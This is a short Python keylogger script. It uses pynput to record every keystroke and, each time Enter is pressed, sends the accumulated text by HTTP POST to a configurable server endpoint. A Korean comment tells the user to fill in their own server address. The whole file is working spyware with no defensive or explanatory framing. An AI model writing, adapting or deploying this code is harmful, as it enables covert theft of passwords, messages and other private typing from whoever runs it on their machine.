from pynput.keyboard import Listener, Key
import requests

server_url = 'http://127.0.0.1/get_logs' # (서버주소/get_logs)입력
logs = ''

def on_press(key):
    global logs
    
    if key == Key.enter:
        try:
            requests.post(server_url, data={'logs': logs})
        except:
            print('Server error!')
            
        logs = ''
    else:
        logs += str(key).replace("'", '')
    
with Listener(on_press=on_press) as listener:
    listener.join()
